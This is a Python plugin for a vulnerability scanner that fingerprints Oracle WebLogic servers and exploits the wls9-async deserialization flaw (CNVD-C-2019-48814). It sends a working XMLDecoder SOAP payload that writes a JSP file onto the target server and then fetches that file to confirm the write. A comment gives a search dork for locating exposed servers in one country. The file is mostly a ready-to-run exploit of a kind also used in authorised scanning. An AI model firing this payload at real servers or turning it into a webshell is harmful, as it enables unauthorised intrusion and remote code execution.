# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *

# "weblogic" && country="CN"
# python batch.py -m

"""
漏洞验证环境为:10.3.6.0
"""


class Script(BaseScript):
    name = 'Weblogic-CNVD-C-2019-48814'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = 'CNVD-C-2019-48814'
        # 来源
        self.bug_refer = 'http://www.cnvd.org.cn/webinfo/show/4999'
        # 特定路径判断
        self.detect_path_list = ['/', '/console']
        # exec
        self.exec_path_list = ['/_async/AsyncResponseService']
        # 相关信息
        self.info = '''Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞 version: WebLogic 10.X, WebLogic 12.1.3'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and ('Hypertext Transfer Protocol' in text or '<i>Hypertext Transfer Protocol -- HTTP/1.1</i>' in text or '/console/framework/skins/wlsconsole/images/login_WebLogic_branding.png' in text or 'WebLogic' in text and 'Welcome to Weblogic Application Server' in text or 'Error 403--' in text or 'Error 404--Not Found' in text or 'Oracle WebLogic Server' in text):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml'})
        async with aiohttp.ClientSession() as session:
            for detect_path in self.exec_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/222222.txt</string><void method="println"><string><![CDATA[<% out.print("1234567890"); %>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None:
                    url2 = f'http://{self.target}/bea_wls_internal/222222.txt' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/bea_wls_internal/222222.txt'
                    text2 = await AsyncFetcher.fetch(session=session, url=url2, headers=self.headers, timeout=self.req_timeout)
                    if text2 is not None and '1234567890' in text2:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': 'Weblogic CNVD-C-2019-48814', 'url': self.target, 'software': self.name}


if __name__ == '__main__':
    pass
